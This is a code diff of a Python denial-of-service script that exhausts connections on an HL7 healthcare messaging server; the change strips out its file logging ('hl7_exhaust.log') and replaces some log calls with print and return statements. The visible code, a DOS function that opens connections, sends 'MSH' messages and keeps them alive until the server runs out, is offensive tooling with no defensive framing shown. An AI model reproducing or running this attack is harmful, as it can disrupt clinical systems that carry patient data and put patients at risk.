@@ -1,9 +1,4 @@
 import socket
-import logging
-
-consoleOuputFileName = "hl7_exhaust.log"
-logging.basicConfig(filename=consoleOuputFileName,level=logging.DEBUG,filemode='w')
-
 
 def DOS(host,port,start):
     message="MSH"
@@ -26,18 +21,16 @@ def DOS(host,port,start):
 
                 try:
                     ack = conn.recv(4096)
-                    logging.debug(ack)
                     if ack:
                         writeAck = ack.decode()
-                        logging.debug("Alive! "+writeAck)
                         continue
                     else:
-                        logging.debug("Exhausted all connections")
+                        print("Exhausted all connections")
                 except socket.timeout as e:
                     return e
 
             except socket.error as e:
-                logging.debug("Exhausted all connections"+ str(e))
+                return("Exhausted all connections"+ str(e))
 
 def startDOS(host,port,start):
     if start == 1:
